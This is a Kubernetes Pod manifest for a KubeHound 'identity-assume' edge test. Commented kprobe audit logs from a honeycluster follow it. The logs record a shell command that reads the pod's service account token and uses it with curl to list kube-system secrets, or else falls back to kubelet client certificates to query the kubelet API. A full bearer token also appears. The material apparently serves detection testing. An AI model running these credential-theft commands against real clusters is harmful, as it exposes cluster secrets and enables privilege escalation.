apiVersion: v1
kind: Pod
metadata:
  name: kh-identity-assume
  namespace: default
  labels:
    app: kubehound-edge-test
spec:
  containers:
  - name: kubehound-identity-assume
    image: entlein/identity-assume:0.0.1
    imagePullPolicy: Always
 

#TODO: add audit logs 
#{"process_kprobe":{"process":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MjcxOTA2MDI5NzQ1ODM6MjgzMzY5", "pid":283369, "uid":0, "cwd":"/", "binary":"/usr/bin/curl", "arguments":"-sSk -H \"Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InpZbG0tdHJaTElfUFUxLWcxRkZSdlZCRjdlNWpHUHZFeWp0ZnF0UWdzN1kifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzY4MzQ1NzE2LCJpYXQiOjE3MzY4MDk3MTYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNmJkMTM0OTAtMmJiNS00OWMwLTk1ZGUtMGQ4YmQzOTQyOTE5Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiaG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmUiLCJ1aWQiOiJhOGM0MjcyNC1hYWE4LTQwOTgtYmVkZi1mYzQ3M2MyZDZhMmYifSwicG9kIjp7Im5hbWUiOiJraC1pZGVudGl0eS1hc3N1bWUiLCJ1aWQiOiJjNDUyZTVlYS1mNDEyLTQ4ODEtOWFiOC01OGM1YTRjOTdjZmQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiJhMzcyYmViNy1iODliLTQ4MzItODQ4Mi02OTAxOTQ3MDQxOWMifSwid2FybmFmdGVyIjoxNzM2ODEzMzIzfSwibmJmIjoxNzM2ODA5NzE2LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpkZWZhdWx0In0.BiFhRx4H4l2khCSGv0Vf1HEt_Dm4ks08SHwY-wbzVHEjf0gxWcSyR70zD4C0JlKmvtHdpY4ysWeGYTa7gHT3FVV-fBOMQk3u5ILP6SV-PrxO7xVAg01ZB7V5ttigNB7sEvnM2FXwL52UefbWxRvSMzp4fCa6PgqwVIGGoHLQwc9qH5GAcOPZr048ExF6_XQ_N6GOAxmYJaupZIVTAoXoijhWZwFVoWuh4qcCfHXmyEiILzTiINPqvtXjutARvxYx3CL4dIxMJMxWzSYqf8WQzFKusf-fKz5o1Js7G7BhhUGUtYmUzD5bnssrtcKR4Gb7KmuXBgGPtVUgt-MzXDcF9A\" https://10.96.0.1:443/api/v1/namespaces/kube-system/secrets", "flags":"execve rootcwd clone dataArgs inInitTree", "start_time":"2025-01-13T23:08:40.279394008Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-identity-assume", "container":{"id":"containerd://3914239b013be34ea89cda79ae92fd81b1f9277873a3f646a2d667d6baa3173a", "name":"kubehound-identity-assume", "image":{"id":"docker.io/entlein/identity-assume@sha256:98c3a722f00e1113a2b71a11b3a83ece0027838f2db9f2724c7834ee49c73696", "name":"docker.io/entlein/identity-assume:0.0.1"}, "start_time":"2025-01-13T23:08:40Z", "pid":11}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-identity-assume", "workload_kind":"Pod"}, "docker":"3914239b013be34ea89cda79ae92fd8", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MjcxOTA1OTg0OTQ2NDg6MjgzMzUw", "refcnt":1, "tid":283369, "in_init_tree":true}, "parent":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MjcxOTA1OTg0OTQ2NDg6MjgzMzUw", "pid":283350, "uid":0, "cwd":"/", "binary":"/bin/bash", "arguments":"-c \"if [[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]]; then KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sSk -H \"Authorization: Bearer $KUBE_TOKEN\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/kube-system/secrets; else NODE_ROOT=/host-node; if [[ -f \"/etc/kubernetes/kubelet.conf\" ]]; then echo \"kubelet.conf found.\"; CERT_PATH=$(grep client-certificate \"/etc/kubernetes/kubelet.conf\" | awk -F ': ' '{print $2}' | tr -d '\"'); KEY_PATH=$(grep client-key \"/etc/kubernetes/kubelet.conf\" | awk -F ': ' '{print $2}' | tr -d '\"'); curl -k --cacert \"/etc/kubernetes/pki/ca.crt\" --key \"$KEY_PATH\" --cert \"$CERT_PATH\" https://${NODE_IP}:10250/pods/; fi; fi; sleep infinity\"", "flags":"execve rootcwd clone inInitTree", "start_time":"2025-01-13T23:08:40.274914628Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-identity-assume", "container":{"id":"containerd://3914239b013be34ea89cda79ae92fd81b1f9277873a3f646a2d667d6baa3173a", "name":"kubehound-identity-assume", "image":{"id":"docker.io/entlein/identity-assume@sha256:98c3a722f00e1113a2b71a11b3a83ece0027838f2db9f2724c7834ee49c73696", "name":"docker.io/entlein/identity-assume:0.0.1"}, "start_time":"2025-01-13T23:08:40Z", "pid":1}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-identity-assume", "workload_kind":"Pod"}, "docker":"3914239b013be34ea89cda79ae92fd8", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MjcxODczOTAzODU2OTg6MjgzMjI4", "tid":283350, "in_init_tree":true}, "function_name":"tcp_connect", "args":[{"sock_arg":{"family":"AF_INET", "type":"SOCK_STREAM", "protocol":"IPPROTO_TCP", "saddr":"10.244.0.31", "daddr":"10.96.0.1", "sport":37054, "dport":443, "cookie":"18446613424241941248", "state":"TCP_SYN_SENT"}}], "action":"KPROBE_ACTION_POST", "policy_name":"monitor-network-activity-outside-cluster-cidr-range", "return_action":"KPROBE_ACTION_POST"}, "node_name":"honeycluster-control-plane", "time":"2025-01-13T23:08:40.327003376Z"}
#{"process_kprobe":{"process":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MjcxOTA2MDExMTAyNzg6MjgzMzY2", "pid":283366, "uid":0, "cwd":"/", "binary":"/usr/bin/cat", "arguments":"/var/run/secrets/kubernetes.io/serviceaccount/token", "flags":"execve rootcwd clone inInitTree", "start_time":"2025-01-13T23:08:40.277530396Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-identity-assume", "container":{"id":"containerd://3914239b013be34ea89cda79ae92fd81b1f9277873a3f646a2d667d6baa3173a", "name":"kubehound-identity-assume", "image":{"id":"docker.io/entlein/identity-assume@sha256:98c3a722f00e1113a2b71a11b3a83ece0027838f2db9f2724c7834ee49c73696", "name":"docker.io/entlein/identity-assume:0.0.1"}, "start_time":"2025-01-13T23:08:40Z", "pid":10}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-identity-assume", "workload_kind":"Pod"}, "docker":"3914239b013be34ea89cda79ae92fd8", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MjcxOTA1OTg0OTQ2NDg6MjgzMzUw", "refcnt":1, "tid":283366, "in_init_tree":true}, "parent":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MjcxOTA1OTg0OTQ2NDg6MjgzMzUw", "pid":283350, "uid":0, "cwd":"/", "binary":"/bin/bash", "arguments":"-c \"if [[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]]; then KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sSk -H \"Authorization: Bearer $KUBE_TOKEN\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/kube-system/secrets; else NODE_ROOT=/host-node; if [[ -f \"/etc/kubernetes/kubelet.conf\" ]]; then echo \"kubelet.conf found.\"; CERT_PATH=$(grep client-certificate \"/etc/kubernetes/kubelet.conf\" | awk -F ': ' '{print $2}' | tr -d '\"'); KEY_PATH=$(grep client-key \"/etc/kubernetes/kubelet.conf\" | awk -F ': ' '{print $2}' | tr -d '\"'); curl -k --cacert \"/etc/kubernetes/pki/ca.crt\" --key \"$KEY_PATH\" --cert \"$CERT_PATH\" https://${NODE_IP}:10250/pods/; fi; fi; sleep infinity\"", "flags":"execve rootcwd clone inInitTree", "start_time":"2025-01-13T23:08:40.274914628Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-identity-assume", "container":{"id":"containerd://3914239b013be34ea89cda79ae92fd81b1f9277873a3f646a2d667d6baa3173a", "name":"kubehound-identity-assume", "image":{"id":"docker.io/entlein/identity-assume@sha256:98c3a722f00e1113a2b71a11b3a83ece0027838f2db9f2724c7834ee49c73696", "name":"docker.io/entlein/identity-assume:0.0.1"}, "start_time":"2025-01-13T23:08:40Z", "pid":1}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-identity-assume", "workload_kind":"Pod"}, "docker":"3914239b013be34ea89cda79ae92fd8", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6MjcxODczOTAzODU2OTg6MjgzMjI4", "tid":283350, "in_init_tree":true}, "function_name":"security_file_permission", "args":[{"file_arg":{"path":"/run/secrets/kubernetes.io/serviceaccount/..2025_01_13_23_08_36.30605793/token", "permission":"-rw-r--r--"}}, {"int_arg":4}], "return":{"int_arg":0}, "action":"KPROBE_ACTION_POST", "policy_name":"enumerate-service-account", "return_action":"KPROBE_ACTION_POST"}, "node_name":"honeycluster-control-plane", "time":"2025-01-13T23:08:40.278405377Z"}